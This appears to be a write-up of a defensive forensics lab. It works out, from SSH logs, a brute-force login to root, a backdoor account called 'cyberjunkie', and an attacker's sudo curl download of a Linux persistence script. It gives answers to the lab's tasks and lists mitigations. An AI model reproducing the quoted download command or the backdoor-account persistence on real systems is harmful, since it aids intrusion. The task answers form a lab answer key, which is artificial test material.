#  üïµÔ∏è Brutus Lab Investigation

## Task 1: Identify the Attacker's IP Address

- **IP Address Used by the Attacker**: `65.2.161.68`
- The attacker used this IP address to carry out a brute force attack, which can be seen in the logs.

## Task 2: Identifying the Compromised Account

- **Compromised Account**: `root`
- The attacker successfully gained access to this account after multiple failed login attempts.

## Task 3: Identify the Timestamp of Attacker's Manual Login

- **Login Time**: `2024-03-06 06:32:45`
- The login time is found in the `wtmp` artifact, and it is different from the authentication time.

## Task 4: Identifying the Session Number

- **Session Number**: `37`
- SSH login sessions are tracked and assigned a session number. This session number corresponds to the attacker's session for the user account `root`.

## Task 5: Discovering the Attacker's Persistence Strategy

- **Backdoor Account Created by the Attacker**: `cyberjunkie`
- The attacker added this new user account as part of their persistence strategy on the server and gave it higher privileges.

## Task 6: MITRE ATT&CK Sub-Technique ID

- **MITRE ATT&CK Sub-Technique ID**: `T1136.001`
- The attacker used the **T1136.001** sub-technique for persistence by creating a new account, as part of their attack strategy.

## Task 7: End Time of the Attacker's First SSH Session

- **Session End Time**: `2024-03-06 06:37:24`
- This timestamp corresponds to when the attacker's first SSH session ended, as noted in the `auth.log`.

## Task 8: Full Command Executed by the Attacker Using Sudo

- **Command Executed**:  
  `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
- The attacker logged into their backdoor account and used `sudo` privileges to execute this command to download a script.

### **Findings and Mitigation Steps:**

- **Attack Vector**: Brute-force attack via SSH (`auth.log` analysis)
- **Persistence Mechanism**: Created a new privileged backdoor user (`cyberjunkie`)
- **Mitigation Steps**:
  - **Enforce strong SSH authentication** (disable password logins, use key-based authentication)
  - **Enable fail2ban** to block brute-force attempts
  - **Monitor new user creations & privilege escalations**
  - **Analyze outbound connections** for malicious activity (`curl` downloads)
